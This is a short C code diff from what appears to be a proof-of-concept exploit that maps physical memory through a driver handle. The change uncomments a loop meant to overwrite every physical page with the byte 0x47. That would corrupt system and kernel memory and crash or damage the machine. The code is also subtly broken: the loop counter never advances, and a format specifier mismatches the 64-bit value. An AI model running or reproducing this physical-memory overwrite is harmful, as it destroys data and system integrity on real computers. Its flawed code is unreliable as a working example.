@@ -204,18 +204,16 @@ int main(char argc, char** argv)
 	system("pause");
 
 	PDWORD64 buf = (PDWORD64)malloc(0x1000);
-	MapPhysicalMemory(phys32Struct.PhysicalMemoryHandle, 0, 0x1000, buf);
-	/*
-	unsigned int page = 0x100000;
+	if (buf == 0) {
+		exit(EXIT_FAILURE);
+	}
+
 	for (__int64 page = 0; page < 0x7FFFFFFFFFFF; page + 0x1000) {
 		MapPhysicalMemory(phys32Struct.PhysicalMemoryHandle, page, 0x1000, buf);
 		memset(buf, 0x47, 0x1000);
-		printf("Set %p to 0x47: \n", page);
+		printf("Set %ld to 0x47: \n", page);
 	}
-	*/
 
-	memset(buf, 0x47, 0x1000);
-	system("pause");
 	free(buf);
 
 	CloseHandle(phys32Struct.PhysicalMemoryHandle);
